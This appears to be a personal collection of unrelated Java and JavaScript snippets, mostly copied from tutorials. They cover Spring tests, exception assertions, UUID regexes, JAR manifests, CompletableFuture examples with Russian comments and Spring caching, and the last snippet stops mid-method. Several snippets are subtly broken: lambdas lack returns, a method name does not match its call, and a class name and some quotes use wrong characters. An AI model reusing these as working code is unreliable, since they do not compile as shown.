--------------------------------------------------------------------------------------------------------
@RunWith(SpringRunner.class) 
@WebMvcTest
@AutoConfigureMockMvc
public class UserControllerIntegrationTest {
 
    @MockBean
    private UserRepository userRepository;
     
    @Autowired
    UserController userController;
 
    @Autowired
    private MockMvc mockMvc;
 
    //...
     
}

@Test
public void whenPostRequestToUsersAndValidUser_thenCorrectResponse() throws Exception {
    MediaType textPlainUtf8 = new MediaType(MediaType.TEXT_PLAIN, Charset.forName("UTF-8"));
    String user = "{\"name\": \"bob\", \"email\" : \"bob@domain.com\"}";
    mockMvc.perform(MockMvcRequestBuilders.post("/users")
      .content(user)
      .contentType(MediaType.APPLICATION_JSON_UTF8))
      .andExpect(MockMvcResultMatchers.status().isOk())
      .andExpect(MockMvcResultMatchers.content()
        .contentType(textPlainUtf8));
}
--------------------------------------------------------------------------------------------------------
String user = URLEncoder.encode(mailUserEmail, ConstantUtil.CHARACTER_ENCODING);
--------------------------------------------------------------------------------------------------------
function createUUID() {
    return uuid.v4();
}

// version 4
// createUUID.regex = '^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4[a-fA-F0-9]{3}-[89abAB][a-fA-F0-9]{3}-[a-fA-F0-9]{12}$';
createUUID.regex = '^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}$';

createUUID.is = function (str) {
    return new RegExp(createUUID.regex).test(str);
};

const uuidV4Regex = /^[A-F\d]{8}-[A-F\d]{4}-4[A-F\d]{3}-[89AB][A-F\d]{3}-[A-F\d]{12}$/i;
// compared to:     /^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4{1}[a-fA-F0-9]{3}-[89abAB]{1}[a-fA-F0-9]{3}-[a-fA-F0-9]{12}$/

const isValidV4UUID = uuid => uuidV4Regex.test(uuid);
--------------------------------------------------------------------------------------------------------
IOUtils.toString(Thread.currentThread().getContextClassLoader().getResourceAsStream("rsb-configuration-default.json"))
--------------------------------------------------------------------------------------------------------
import static org.hamcrest.CoreMatchers.is; 
import static org.hamcrest.CoreMatchers.nullValue; 
import static org.junit.Assert.assertThat; 
import static org.mockito.Mockito.mock; 
import static org.mockito.Mockito.when; 
 
import java.io.File; 
import java.net.URI; 
import java.net.URISyntaxException; 
import java.util.Arrays; 
import java.util.Calendar; 
import java.util.Collections; 
import java.util.GregorianCalendar; 
import java.util.TimeZone; 
 
import javax.ws.rs.core.HttpHeaders; 
import javax.xml.datatype.XMLGregorianCalendar; 
 
import org.junit.Test; 
 
/**
 * @author "OpenAnalytics <rsb.development@openanalytics.eu>" 
 */ 
public class UtilTestCase 
{ 
    @Test 
    public void isValidApplicationName() 
    { 
        assertThat(Util.isValidApplicationName("test123"), is(true)); 
        assertThat(Util.isValidApplicationName("123ABC"), is(true)); 
        assertThat(Util.isValidApplicationName("123_ABC"), is(true)); 
        assertThat(Util.isValidApplicationName("123-ABC"), is(false)); 
        assertThat(Util.isValidApplicationName(null), is(false)); 
        assertThat(Util.isValidApplicationName(""), is(false)); 
        assertThat(Util.isValidApplicationName("-test"), is(false)); 
        assertThat(Util.isValidApplicationName("1 2 3"), is(false)); 
    } 
 
    @SuppressWarnings("unchecked") 
    @Test 
    public void getSingleHeader() 
    { 
        final HttpHeaders httpHeaders = mock(HttpHeaders.class); 
        assertThat(Util.getSingleHeader(httpHeaders, "missing"), is(nullValue())); 
 
        when(httpHeaders.getRequestHeader("missing_too")).thenReturn(Collections.EMPTY_LIST); 
        assertThat(Util.getSingleHeader(httpHeaders, "missing_too"), is(nullValue())); 
 
        when(httpHeaders.getRequestHeader("single_value")).thenReturn(Collections.singletonList("bingo")); 
        assertThat(Util.getSingleHeader(httpHeaders, "single_value"), is("bingo")); 
 
        when(httpHeaders.getRequestHeader("multi_value")).thenReturn(Arrays.asList("bingo_too", "ignored")); 
        assertThat(Util.getSingleHeader(httpHeaders, "multi_value"), is("bingo_too")); 
    } 
 
    @Test 
    public void getMimeType() 
    { 
        assertThat(Util.getMimeType(new File("test.zip")).toString(), is(Constants.ZIP_MIME_TYPE.toString())); 
        assertThat(Util.getMimeType(new File("test.err.txt")).toString(), 
            is(Constants.TEXT_MIME_TYPE.toString())); 
        assertThat(Util.getMimeType(new File("test.pdf")).toString(), is(Constants.PDF_MIME_TYPE.toString())); 
        assertThat(Util.getMimeType(new File("test.foo")).toString(), is("application/octet-stream")); 
    } 
 
    @Test 
    public void getResourceType() 
    { 
        assertThat(Util.getResourceType(Constants.ZIP_MIME_TYPE), is("zip")); 
        assertThat(Util.getResourceType(Constants.PDF_MIME_TYPE), is("pdf")); 
        assertThat(Util.getResourceType(Constants.TEXT_MIME_TYPE), is("txt")); 
        assertThat(Util.getResourceType(Constants.DEFAULT_MIME_TYPE), is("dat")); 
    } 
 
    @Test 
    public void convertToXmlDate() 
    { 
        final GregorianCalendar gmtMinus8Calendar = new GregorianCalendar( 
            TimeZone.getTimeZone(TimeZone.getAvailableIDs(-8 * 60 * 60 * 1000)[0])); 
        gmtMinus8Calendar.set(2010, Calendar.JULY, 21, 11, 35, 48); 
        gmtMinus8Calendar.set(GregorianCalendar.MILLISECOND, 456); 
 
        final XMLGregorianCalendar xmlDate = Util.convertToXmlDate(gmtMinus8Calendar); 
        assertThat(xmlDate.getTimezone(), is(0)); 
        assertThat(xmlDate.toXMLFormat(), is("2010-07-21T18:35:48.456Z")); 
    } 
 
    @Test(expected = IllegalArgumentException.class) 
    public void newURIFailure() 
    { 
        Util.newURI(" a b c "); 
    } 
 
    @Test 
    public void newURISuccess() throws URISyntaxException 
    { 
        assertThat(Util.newURI("foo://bar"), is(new URI("foo://bar"))); 
    } 
}
--------------------------------------------------------------------------------------------------------
private SearchTerm fromAndNotSeenTerm(final Flags supportedFlags, final Folder folder) {
    try {
        final FromTerm fromTerm = new FromTerm(new InternetAddress("bar@baz"));
        return new AndTerm(fromTerm, new FlagTerm(new Flags(Flags.Flag.SEEN), false));
    } catch (AddressException e) {
        throw new RuntimeException(e);
    }
}
--------------------------------------------------------------------------------------------------------
import static org.hamcrest.Matchers.hasProperty;
import static org.hamcrest.Matchers.is;
import static org.hamcrest.Matchers.startsWith;

import javax.ws.rs.NotFoundException;
import javax.ws.rs.core.Response;
import javax.ws.rs.core.Response.Status;

import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.ExpectedException;

public class TestExy {
    @Rule
    public ExpectedException thrown = ExpectedException.none();

    @Test
    public void shouldThrow() {
        TestThing testThing = new TestThing();
        thrown.expect(NotFoundException.class);
        thrown.expectMessage(startsWith("some Message"));
        thrown.expect(hasProperty("response", hasProperty("status", is(404))));
        testThing.chuck();
    }

    private class TestThing {
        public void chuck() {
            Response response = Response.status(Status.NOT_FOUND).entity("Resource not found").build();
            throw new NotFoundException("some Message", response);
        }
    }
}

@Rule
public ExpectedException thrown = ExpectedException.none();

@Test
public void shouldTestExceptionMessage() throws IndexOutOfBoundsException {
    List<Object> list = new ArrayList<Object>();
 
    thrown.expect(IndexOutOfBoundsException.class);
    thrown.expectMessage("Index: 0, Size: 0");
    list.get(0); // execution will never get past this line
}
--------------------------------------------------------------------------------------------------------
@TestPropertySource(
        properties = {
                "spring.jpa.hibernate.ddl-auto=validate",
                "liquibase.enabled=false"
        }
)

@RunWith(SpringRunner.class)
@SpringBootTest
public class AddressFieldsTest {

    @InjectMocks
    AddressFieldsValidator addressFieldsValidator;

    @Autowired
    AddressFieldsConfig addressFieldsConfig;
    ...........

    @Before
    public void setUp() throws Exception{
        MockitoAnnotations.initMocks(this);
        ReflectionTestUtils.setField(addressFieldsValidator,"addressFieldsConfig", addressFieldsConfig);
    }

}

@Data
@Component
@RefreshScope
@ConfigurationProperties(prefix = "address.fields.regex")
public class AddressFieldsConfig {

    private int firstName;
    private int lastName;
    .........
	
@SpringBootTest(
        properties = ["spring.profiles.active=test"],
        classes = Application.class,
)
public class MyIntTest {
--------------------------------------------------------------------------------------------------------
final Validator validator = Validation.buildDefaultValidatorFactory().getValidator();
final Set<ConstraintViolation<Object>> violations = validator
    .forExecutables()
    .validateParameters(
    object,
    method,
    args
);
import javax.validation.constraints.NotNull;
interface Foo {
    void test(@NotNull(message = "foo") String value);
}

class Bar implements Foo {
    @Override
    public void test(@NotNull final String value) {
        System.out.println(value);
    }
}

import static org.hamcrest.Matchers.hasProperty;
import static org.hamcrest.Matchers.is;
import static org.hamcrest.Matchers.startsWith;

import javax.ws.rs.NotFoundException;
import javax.ws.rs.core.Response;
import javax.ws.rs.core.Response.Status;

import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.ExpectedException;

public class TestExy {
    @Rule
    public ExpectedException thrown = ExpectedException.none();

    @Test
    public void shouldThrow() {
        TestThing testThing = new TestThing();
        thrown.expect(NotFoundException.class);
        thrown.expectMessage(startsWith("some Message"));
        thrown.expect(hasProperty("response", hasProperty("status", is(404))));
        testThing.chuck();
    }

    private class TestThing {
        public void chuck() {
            Response response = Response.status(Status.NOT_FOUND).entity("Resource not found").build();
            throw new NotFoundException("some Message", response);
        }
    }
}
--------------------------------------------------------------------------------------------------------
  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::        (v2.1.4.RELEASE)
--------------------------------------------------------------------------------------------------------
curl -X POST "http://vdlg-pba11-auth-1.pba.internal:20025/api/v1/crm-adapter/mails" -H "accept: application/json;charset=UTF-8" -H "Content-Type: application/json" -d "{ \"AttachedId\": [ \"string\" ], \"Locale\": \"string\", \"ResponseData\": {}, \"ResponseId\": \"string\", \"Subject\": \"string\", \"TemplateName\": \"string\", \"UserId\": \"string\"}"
--------------------------------------------------------------------------------------------------------
    ThreadFactory threadFactory =
        new ThreadFactory() {

          private final AtomicInteger threadNumber = new AtomicInteger(0);

          @Override
          public Thread newThread(@Nonnull Runnable r) {
            return new Thread(
                r, ThreadUtil.THREAD_NAME + "-PoolService-" + threadNumber.getAndIncrement());
          }
        };
--------------------------------------------------------------------------------------------------------
Manifest-Version: 1.0
Archiver-Version: Plexus Archiver
Created-By: Apache Maven
Built-By: ceki
Build-Jdk: 1.7.0_17
Bundle-Description: The slf4j API
Bundle-Version: 1.7.16
Implementation-Version: 1.7.16
X-Compile-Source-JDK: 1.5
X-Compile-Target-JDK: 1.5
Implementation-Title: slf4j-api
Bundle-ManifestVersion: 2
Bundle-SymbolicName: slf4j.api
Bundle-Name: slf4j-api
Bundle-Vendor: SLF4J.ORG
Bundle-RequiredExecutionEnvironment: J2SE-1.5
Export-Package: org.slf4j;version=1.7.16, org.slf4j.spi;version=1.7.16
 , org.slf4j.helpers;version=1.7.16, org.slf4j.event;version=1.7.16
Import-Package: org.slf4j.impl;version=1.6.0

Manifest-Version: 1.0
Ant-Version: Apache Ant 1.7.1
Created-By: 14.3-b01-101 (Apple Inc.)
Premain-Class: lombok.launch.Agent
Agent-Class: lombok.launch.Agent
Can-Redefine-Classes: true
Main-Class: lombok.launch.Main
Lombok-Version: 1.18.4

Manifest-Version: 1.0
Implementation-Title: opentest4j
Automatic-Module-Name: org.opentest4j
Build-Date: 2018-09-10
Bundle-SymbolicName: org.opentest4j
Implementation-Version: 1.1.1
Built-By: OTA4J Team
Bundle-ManifestVersion: 2
Bnd-LastModified: 1536606747000
Specification-Vendor: opentest4j.org
Specification-Title: opentest4j
Bundle-Vendor: opentest4j.org
Require-Capability: osgi.ee;filter:="(&(osgi.ee=JavaSE)(version=1.6))"
Tool: Bnd-2.4.0.201411031534
Implementation-Vendor: opentest4j.org
Export-Package: org.opentest4j;version="1.1.1"
Bundle-Version: 1.1.1
Bundle-Name: opentest4j
Build-Revision: 55cabbf7e6319c9dd5df68745e06824c50b6b2ef
Build-Time: 21:12:26.111+0200
Created-By: 1.8.0_162 (Oracle Corporation 25.162-b12)
Specification-Version: 1.1.1
--------------------------------------------------------------------------------------------------------
mvn clean install -Dspring.profiles.active="profile_name".
--------------------------------------------------------------------------------------------------------
@Test
public void whenExceptionThrown_thenAssertionSucceeds() {
    String test = null;
    assertThrows(NullPointerException.class, () -> {
        test.length();
    });
}
@Test(expected = NullPointerException.class)
public void whenExceptionThrown_thenExpectationSatisfied() {
    String test = null;
    test.length();
}
@Rule
public ExpectedException exceptionRule = ExpectedException.none();
 
@Test
public void whenExceptionThrown_thenRuleIsApplied() {
    exceptionRule.expect(NumberFormatException.class);
    exceptionRule.expectMessage("For input string");
    Integer.parseInt("1a");
}


--------------------------------------------------------------------------------------------------------
"file.separator"	Character that separates components of a file path. This is “/” on UNIX and “\” on Windows.
"java.class.path"	Path used to find directories and JAR archives containing class files. Elements of the class path are separated by a platform-specific character specified in the path.separator property.
"java.home"	Installation directory for Java Runtime Environment (JRE)
"java.vendor"	JRE vendor name
"java.vendor.url"	JRE vendor URL
"java.version"	JRE version number
"line.separator"	Sequence used by operating system to separate lines in text files
"os.arch"	Operating system architecture
"os.name"	Operating system name
"os.version"	Operating system version
"path.separator"	Path separator character used in java.class.path
"user.dir"	User working directory
"user.home"	User home directory
"user.name"	User account name
--------------------------------------------------------------------------------------------------------
boolean allValid = Arrays.stream(DOT_PATTERN.split(packageName, -1)).allMatch(SourceVersion::isName);
--------------------------------------------------------------------------------------------------------
// Асинхронно запускаем задачу, заданную объектом Runnable
CompletableFuture<Void> future = CompletableFuture.runAsync(new Runnable() {
    @Override
    public void run() {
        // Имитация длительной работы
        try {
            TimeUnit.SECONDS.sleep(1);
        } catch (InterruptedException e) {
            throw new IllegalStateException(e);
        }
        System.out.println("Я буду работать в отдельном потоке, а не в главном.");
    }
});
 
// Блокировка и ожидание завершения Future
future.get();

// Запуск асинхронной задачи, заданной объектом Supplier
CompletableFuture<String> future = CompletableFuture.supplyAsync(new Supplier<String>() {
    @Override
    public String get() {
        try {
            TimeUnit.SECONDS.sleep(1);
        } catch (InterruptedException e) {
            throw new IllegalStateException(e);
        }
        return "Результат асинхронной задачи";
    }
});

CompletableFuture<User> getUsersDetail(String userId) {
    return CompletableFuture.supplyAsync(() -> {
        UserService.getUserDetails(userId);
    });
}
 
CompletableFuture<Double> getCreditRating(User user) {
    return CompletableFuture.supplyAsync(() -> {
        CreditRatingService.getCreditRating(user);
    });
}

CompletableFuture<CompletableFuture<Double>> result = getUserDetail(userId)
        .thenApply(user -> getCreditRating(user));

СompletableFuture<String> future = CompletableFuture.supplyAsync(() -> {
    try {
        TimeUnit.SECONDS.sleep(1);
    } catch (InterruptedException e) {
        throw new IllegalStateException(e);
    }
    return "Результат асинхронной задачи";
}, executor);

System.out.println("Получение веса.");
CompletableFuture<Double> weightInKgFuture = CompletableFuture.supplyAsync(() -> {
    try {
        TimeUnit.SECONDS.sleep(1);
    } catch (InterruptedException e) {
       throw new IllegalStateException(e);
    }
    return 65.0;
});
 
System.out.println("Получение роста.");
CompletableFuture<Double> heightInCmFuture = CompletableFuture.supplyAsync(() -> {
    try {
        TimeUnit.SECONDS.sleep(1);
    } catch (InterruptedException e) {
       throw new IllegalStateException(e);
    }
    return 177.8;
});
 
System.out.println("Расчёт индекса массы тела.");
CompletableFuture<Double> combinedFuture = weightInKgFuture
        .thenCombine(heightInCmFuture, (weightInKg, heightInCm) -> {
    Double heightInMeter = heightInCm / 100;
    return weightInKg/(heightInMeter * heightInMeter);
});
 
System.out.println("Ваш индекс массы тела - " + combinedFuture.get());

// Когда все задачи завершены, вызываем future.join(), чтобы получить результаты и собрать их в список
CompletableFuture<List<String>> allPageContentsFuture = allFutures.thenApply(v -> {
   return pageContentFutures.stream()
           .map(pageContentFuture -> pageContentFuture.join())
           .collect(Collectors.toList());
});

CompletableFuture<String> future1 = CompletableFuture.supplyAsync(() -> {
    try {
        TimeUnit.SECONDS.sleep(2);
    } catch (InterruptedException e) {
       throw new IllegalStateException(e);
    }
    return "Результат Future 1";
});
 
CompletableFuture<String> future2 = CompletableFuture.supplyAsync(() -> {
    try {
        TimeUnit.SECONDS.sleep(1);
    } catch (InterruptedException e) {
       throw new IllegalStateException(e);
    }
    return "Результат Future 2";
});
 
CompletableFuture<String> future3 = CompletableFuture.supplyAsync(() -> {
    try {
        TimeUnit.SECONDS.sleep(3);
    } catch (InterruptedException e) {
       throw new IllegalStateException(e);
    }
    return "Результат Future 3";
});
 
CompletableFuture<Object> anyOfFuture = CompletableFuture.anyOf(future1, future2, future3);
 
System.out.println(anyOfFuture.get()); // Результат Future 2


CompletableFuture<String> maturityFuture = CompletableFuture.supplyAsync(() -> {
    if (age < 0) {
        throw new IllegalArgumentException("Возраст не может быть отрицательным");
    }
    if (age > 18) {
        return "Взрослый";
    } else {
        return "Ребёнок";
    }
}).exceptionally(ex -> {
    System.out.println("Ой! У нас тут исключение - " + ex.getMessage());
    return "Неизвестно!";
});


Integer age = -1;
 
CompletableFuture<String> maturityFuture = CompletableFuture.supplyAsync(() -> {
    if (age < 0) {
        throw new IllegalArgumentException("Возраст не может быть отрицательным");
    }
    if (age > 18) {
        return "Взрослый";
    } else {
        return "Ребёнок";
    }
}).handle((res, ex) -> {
    if (ex != null) {
        System.out.println("Ой! У нас тут исключение - " + ex.getMessage());
        return "Неизвестно!";
    }
    return res;
});
 
System.out.println("Зрелость: " + maturityFuture.get());
--------------------------------------------------------------------------------------------------------
things.stream().filter(filtersCollection.stream().<Predicate>map(f -> f::test)
                       .reduce(Predicate::or).orElse(t->false));
--------------------------------------------------------------------------------------------------------
@RestControllerAdvice
public class GlobalResponseEntityExceptionHandler extends ResponseEntityExceptionHandler {

    @Override
    protected ResponseEntity<Object> handleMissingServletRequestParameter(MissingServletRequestParameterException ex, HttpHeaders headers, HttpStatus status, WebRequest request) {
        return errorResponse(HttpStatus.BAD_REQUEST, "Required request params missing");
    }

    private ResponseEntity<Object> errorResponse(HttpStatus status, String message) {
        return ResponseEntity.status(status).body(message);
    }
}
--------------------------------------------------------------------------------------------------------
@Override
protected ResponseEntity<Object> handleExceptionInternal(Exception ex, Object body,
                             HttpHeaders headers, HttpStatus status, WebRequest request) {
    if (body == null) {
        body = ImmutableMap.builder()
                   .put("timestamp", LocalDateTime.now().atZone(ZoneId.systemDefault()).toEpochSecond())
                   .put("status", status.value())
                   .put("error", status.getReasonPhrase())
                   .put("message", ex.getMessage())
                   .put("exception", ex.getClass().getSimpleName())  // can show FQCN like spring with getName()
                   .put("path", ((ServletWebRequest)request).getRequest().getRequestURI())
                   .build();
    }
    return super.handleExceptionInternal(ex, body, headers, status, request);
}
--------------------------------------------------------------------------------------------------------
public interface DomainOperations<T> {
  default List<T> filter(Predicate<T> predicate) {
    return persons.stream().filter( predicate )
      .collect(Collectors.<Person>toList());
 }
}
--------------------------------------------------------------------------------------------------------
public static void main(String[] args) {
Optional<Employee> maxSalaryEmp=employeeList.stream()
    .reduce((Employee a, Employee b) -> a.getSalary() < b.getSalary() ? b:a);
if(maxSalaryEmp.isPresent())
  System.out.println("Employee with max salary: "+maxSalaryEmp.get());
}
--------------------------------------------------------------------------------------------------------
public class CacheManager {
    public static final List<CacheManager> ALL_CACHE_MANAGERS = new CopyOnWriteArrayList<CacheManager>();
....
}
--------------------------------------------------------------------------------------------------------
@CacheConfig(cacheNames="book", keyGenerator="myKeyGenerator") 
public class BookRepository {

    @Cacheable
    public Book findBook(ISBN isbn) {...}

    public Book thisIsNotCached(String someArg) {...}
}
--------------------------------------------------------------------------------------------------------
public class CacheUtil {
  public static CacheManager myCacheManager;

  public CacheManager getMyCacheManager() {
    if(myCacheManager == null) {
    for (CacheManager cacheManager : CacheManager.ALL_CACHE_MANAGERS) {
       if("myCacheManager".equals(cacheManager.getName())) {
          myCacheManager = cacheManager;
       }
    }
    return myCacheManager;
  }
}
--------------------------------------------------------------------------------------------------------
var cacheManager = require('cache-manager');
var fsStore = require('cache-manager-fs');
var diskCache = cacheManager.caching({
    store: fsStore, options: {
      ttl: 60*60,
      maxsize: 1000*1000*1000,
      path: 'diskcache',
      preventfill: true
    }
  });

var ttl = 30;

function getUser(id, cb) {
    setTimeout(function () {
        console.log("Returning user from slow database.");
        cb(null, {id: id, name: 'Bob'});
    }, 5000);
}

var userId = 123;
var key = 'user_' + userId;

// Note: ttl is optional in wrap()
memoryCache.wrap(key, function (cb) {
    getUser(userId, cb);
}, {ttl: ttl}, function (err, user) {
    console.log(user);

    // Second time fetches user from memoryCache
    memoryCache.wrap(key, function (cb) {
        getUser(userId, cb);
    }, function (err, user) {
        console.log(user);
    });
});
--------------------------------------------------------------------------------------------------------
@Bean
public CacheManager cacheManager() {
	SimpleCacheManager cacheManager = new SimpleCacheManager();
	cacheManager.setCaches( Collections.singletonList( new ConcurrentMapCache( “userCache” ) ) );

	// manually call initialize the caches as our SimpleCacheManager is not declared as a bean
	cacheManager.initializeCaches(); 

	return new TransactionAwareCacheManagerProxy( cacheManager );
}
--------------------------------------------------------------------------------------------------------
Cache transactionAwareUserCache( CacheManager cacheManager ) {
	return new TransactionAwareCacheDecorator( cacheManager.getCache( “userCache” ) );
}
--------------------------------------------------------------------------------------------------------
@Bean
public CacheManager cacheManager( net.sf.ehcache.CacheManager ehCacheCacheManager ) {
	EhCacheCacheManager cacheManager = new EhCacheCacheManager();
	cacheManager.setCacheManager( ehCacheCacheManager );
	cacheManager.setTransactionAware( true );
	return cacheManager;
}
--------------------------------------------------------------------------------------------------------
class UserService {
	@Cacheable(value = "userCache", unless = "#result != null")
	public User getUserById( long id ) {
   		return userRepository.getById( id );
	}
}
 
class UserRepository {
	@Caching(
      put = {
            @CachePut(value = "userCache", key = "'username:' + #result.username", condition = "#result != null"),
            @CachePut(value = "userCache", key = "#result.id", condition = "#result != null")
      }
	)
	@Transactional(readOnly = true)
	public User getById( long id ) {
	   ...
	}
}
--------------------------------------------------------------------------------------------------------
import org.springframework.core.io.Resource;
import org.springframework.core.io.ResourceLoader;
import org.springframework.core.io.support.PathMatchingResourcePatternResolver;

import java.io.IOException;
import java.util.Arrays;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SingleAppResourcePatternResolver extends PathMatchingResourcePatternResolver {

    public static final Pattern JAR_NAME_PATTERN = Pattern.compile(".*/(.+?\\.jar).*");

    private Set<String> dependencyJars;

    public SingleAppResourcePatternResolver(ResourceLoader resourceLoader, Set<String> dependencyJars) {
        super(resourceLoader);
        this.dependencyJars = dependencyJars;
    }

    @Override
    public Resource[] getResources(String locationPattern) throws IOException {
        Resource[] resources = super.getResources(locationPattern);
        return Arrays.stream(resources)
                .filter(this::foundInDependencies)
                .toArray(Resource[]::new);
    }

    private boolean foundInDependencies(Resource resource) {
        try {
            String url = resource.getURL().toString();
            if (url.contains("META-INF/resources/webjars/")) {
                // WebJAR resources could be loaded from shared dependencies
                return true;
            }

            Matcher matcher = JAR_NAME_PATTERN.matcher(url);
            if (matcher.find()) {
                String jarName = matcher.group(1);
                return dependencyJars.contains(jarName);
            }
            return true;
        } catch (IOException e) {
            throw new RuntimeException("An error occurred while looking for resources", e);
        }
    }
}
--------------------------------------------------------------------------------------------------------
import javax.annotation.Nullable;
import java.util.*;

/**
 * Describes an app component which the current application depends on.
 */
public class AppComponent implements Comparable<AppComponent> {

    private final String id;
    private final List<AppComponent> dependencies = new ArrayList<>();
    private Properties properties;
    private Set<String> additiveProperties;

    public AppComponent(String id) {
        this.id = id;
    }

    /**
     * @return app component Id
     */
    public String getId() {
        return id;
    }

    /**
     * @return descriptor path by convention
     */
    public String getDescriptorPath() {
        return id.replace('.', '/') + "/app-component.xml";
    }

    /**
     * INTERNAL.
     * Add a dependency to the component.
     */
    public void addDependency(AppComponent other) {
        if (dependencies.contains(other))
            return;
        if (other.dependsOn(this))
            throw new RuntimeException("Circular dependency between app components '" + this + "' and '" + other + "'");

        dependencies.add(other);
    }

    /**
     * Check if this component depends on the given component.
     */
    public boolean dependsOn(AppComponent other) {
        for (AppComponent dependency : dependencies) {
            if (dependency.equals(other) || dependency.dependsOn(other))
                return true;
        }
        return false;
    }

    /**
     * INTERNAL.
     * Set a file-based app property defined in this app component.
     */
    public void setProperty(String name, String value, boolean additive) {
        if (properties == null)
            properties = new Properties();

        if (additive) {
            if (additiveProperties == null) {
                additiveProperties = new HashSet<>();
            }
            additiveProperties.add(name);
        } else if (additiveProperties != null) {
            additiveProperties.remove(name);
        }

        properties.setProperty(name, value);
    }

    /**
     * @return a file-based app property defined in this app component or null if not found
     */
    @Nullable
    public String getProperty(String property) {
        return properties == null ? null : properties.getProperty(property);
    }

    public boolean isAdditiveProperty(String property) {
        return additiveProperties != null && additiveProperties.contains(property);
    }

    /**
     * @return names of properties exported by this app component, sorted in natural order
     */
    public List<String> getPropertyNames() {
        if (properties == null) {
            return Collections.emptyList();
        }
        List<String> list = new ArrayList<>(properties.stringPropertyNames());
        list.sort(Comparator.naturalOrder());
        return list;
    }

    @Override
    public int compareTo(AppComponent other) {
        if (this.dependsOn(other))
            return 1;
        if (other.dependsOn(this)) {
            return -1;
        }
        return 0;
    }

    @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (o == null || getClass() != o.getClass()) return false;

        AppComponent that = (AppComponent) o;

        return id.equals(that.id);

    }

    @Override
    public int hashCode() {
        return id.hashCode();
    }

    @Override
    public String toString() {
        return id;
    }
}
--------------------------------------------------------------------------------------------------------
import com.haulmont.cuba.core.global.MessageTools;
import com.haulmont.cuba.core.global.Messages;
import org.hibernate.validator.internal.engine.messageinterpolation.InterpolationTerm;
import org.hibernate.validator.internal.engine.messageinterpolation.InterpolationTermType;
import org.hibernate.validator.internal.engine.messageinterpolation.parser.Token;
import org.hibernate.validator.internal.engine.messageinterpolation.parser.TokenCollector;
import org.hibernate.validator.internal.engine.messageinterpolation.parser.TokenIterator;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import javax.el.ExpressionFactory;
import javax.validation.MessageInterpolator;
import javax.validation.ValidationException;
import java.util.List;
import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class CubaValidationMessagesInterpolator implements MessageInterpolator {
    protected static final String DEFAULT_CONSTRAINTS_MESSAGE_PACK = "com.haulmont.cuba.core.global.validation";

    private final Logger log = LoggerFactory.getLogger(CubaValidationMessagesInterpolator.class);

    protected Messages messages;
    protected ExpressionFactory expressionFactory;
    protected Locale locale;

    protected static final Pattern LEFT_BRACE = Pattern.compile("\\{", Pattern.LITERAL);
    protected static final Pattern RIGHT_BRACE = Pattern.compile("\\}", Pattern.LITERAL);
    protected static final Pattern SLASH = Pattern.compile("\\\\", Pattern.LITERAL);
    protected static final Pattern DOLLAR = Pattern.compile("\\$", Pattern.LITERAL);

    public CubaValidationMessagesInterpolator(Messages messages, Locale locale) {
        this.messages = messages;
        this.locale = locale;
        this.expressionFactory = ExpressionFactory.newInstance();
    }

    @Override
    public String interpolate(String messageTemplate, Context context) {
        Locale defaultLocale = locale;
        return interpolate(messageTemplate, context, defaultLocale);
    }

    @Override
    public String interpolate(String messageTemplate, Context context, Locale locale) {
        String interpolatedMessage = messageTemplate;
        try {
            interpolatedMessage = interpolateMessage(messageTemplate, context, locale);
        } catch (ValidationException e) {
            log.error("Unable to interpolate validation message: {}", e.getMessage());
        }
        return interpolatedMessage;
    }

    protected String interpolateMessage(String messageTemplate, Context context, Locale locale) {
        String resolvedMessage = interpolateMessage(messageTemplate, locale);

        TokenCollector tokenCollector = new TokenCollector(resolvedMessage, InterpolationTermType.PARAMETER);
        List<Token> tokens = tokenCollector.getTokenList();

        resolvedMessage = interpolateExpression(new TokenIterator(tokens), context, locale);

        tokenCollector = new TokenCollector(resolvedMessage, InterpolationTermType.EL);
        tokens = tokenCollector.getTokenList();

        resolvedMessage = interpolateExpression(new TokenIterator(tokens), context, locale);

        resolvedMessage = replaceEscapedLiterals(resolvedMessage);

        return resolvedMessage;
    }

    protected String interpolateExpression(TokenIterator tokenIterator, Context context, Locale locale) {
        while (tokenIterator.hasMoreInterpolationTerms()) {
            String term = tokenIterator.nextInterpolationTerm();

            InterpolationTerm expression = new InterpolationTerm(term, locale, expressionFactory);
            String resolvedExpression = expression.interpolate(context);
            tokenIterator.replaceCurrentInterpolationTerm(resolvedExpression);
        }
        return tokenIterator.getInterpolatedMessage();
    }

    protected String replaceEscapedLiterals(String resolvedMessage) {
        resolvedMessage = LEFT_BRACE.matcher(resolvedMessage).replaceAll("{");
        resolvedMessage = RIGHT_BRACE.matcher(resolvedMessage).replaceAll("}");
        resolvedMessage = SLASH.matcher(resolvedMessage).replaceAll(Matcher.quoteReplacement("\\"));
        resolvedMessage = DOLLAR.matcher(resolvedMessage).replaceAll(Matcher.quoteReplacement("$"));
        return resolvedMessage;
    }

    protected String interpolateMessage(String message, Locale locale) {
        TokenCollector tokenCollector = new TokenCollector(message, InterpolationTermType.PARAMETER);
        TokenIterator tokenIterator = new TokenIterator(tokenCollector.getTokenList());
        while (tokenIterator.hasMoreInterpolationTerms()) {
            String term = tokenIterator.nextInterpolationTerm();
            String resolvedParameterValue = resolveParameter(term, locale);
            tokenIterator.replaceCurrentInterpolationTerm(resolvedParameterValue);
        }
        return tokenIterator.getInterpolatedMessage();
    }

    protected String resolveParameter(String parameterName, Locale locale) {
        String parameterValue;
        String messageCode = removeCurlyBraces(parameterName);
        try {
            if (messageCode.startsWith("javax.validation.constraints")
                    || messageCode.startsWith("org.hibernate.validator.constraints")) {
                parameterValue = messages.getMessage(DEFAULT_CONSTRAINTS_MESSAGE_PACK, messageCode, locale);
                // try to find tokens recursive
                parameterValue = interpolateMessage(parameterValue, locale);
